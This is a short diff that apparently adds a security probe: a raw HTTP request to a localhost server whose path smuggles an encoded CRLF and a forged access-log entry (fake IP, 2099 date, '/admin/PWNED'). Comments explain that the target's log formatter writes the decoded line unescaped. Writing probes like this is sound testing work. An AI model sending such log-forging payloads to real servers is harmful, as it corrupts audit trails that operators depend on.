@@ -1,0 +1,5 @@
+# %0d%0a in the path decodes (unquote) to a real CRLF inside PATH_INFO, which
+# format_log interpolates unescaped -> a forged standalone access-log record.
+GET /x%0d%0a66.66.66.66%20-%20-%20%5B01/Jan/2099%3A00%3A00%3A00%20%2B0000%5D%20%22GET%20/admin/PWNED%20HTTP/1.1%22%20200%200%20%22-%22%20%22-%22 HTTP/1.1
+Host: localhost:22571
+User-Agent: probe
